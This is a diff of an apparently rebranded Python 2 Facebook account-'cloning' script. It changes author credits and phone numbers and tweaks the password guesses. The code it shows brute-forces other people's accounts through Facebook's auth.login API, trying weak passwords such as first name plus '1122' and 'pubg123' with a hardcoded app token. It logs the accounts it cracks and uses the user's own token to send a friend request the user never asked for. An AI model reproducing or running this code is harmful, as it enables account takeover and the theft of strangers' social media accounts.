@@ -60,9 +60,9 @@ logo = """
 \033[1;33;40m ➣Facebook → shoaib.blouch01
 \033[1;34;40m ➣Github   → https://github.com/shoaibblouch
 \033[1;35;40m ➣Youtube  → Fb tricks by shoaib
-\033[1;36;40m ➣Instructions by → Raza Sajjad
-\033[1;37;40m ➣☏        → +923130579054
-\033[1;38;40m ➣pray for me and Raza 
+\033[1;36;40m ➣ Aadam
+\033[1;37;40m ➣☏        → +923377289367
+\033[1;38;40m ➣ King
 \033[1;39;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 """
 
@@ -70,7 +70,11 @@ logo = """
 logo2 = """
 	\033[1;32;40m ➣ Not responsible for any miss use
 \033[1;32;40m  
+ 
 
+▄▀█ ▄▀█ █▀▄ ▄▀█ █▀▄▀█
+█▀█ █▀█ █▄▀ █▀█ █░▀░█
+ 
 █▀ █░█ █▀█ ▄▀█ █ █▄▄
 ▄█ █▀█ █▄█ █▀█ █ █▄█
 """
@@ -132,7 +136,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://www.youtube.com/channel/UCKQ85sgFrddygumAGP8b5pQ')
+				os.system('xdg-open https://facebook.com/shoaibblouch01')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -290,7 +294,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;93mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print " \033[1;31;40m●════════════════════════◄►═══════════Shoaib═════════════●"
+	print " \033[1;31;40m●════════════════════════◄►═══════════Aadam═════════════●"
 
 	jalan(' \033[1;93mCloning Started  Wait...')
 	print  "\033[1;36;40m ●══════════════Shoaib══════════◄►════════════════════════●" 
@@ -333,7 +337,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '12345'
+							pass3 = b['first_name'] + '1122'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -375,7 +379,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = '123456'
+													pass6 = 'pubg123'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
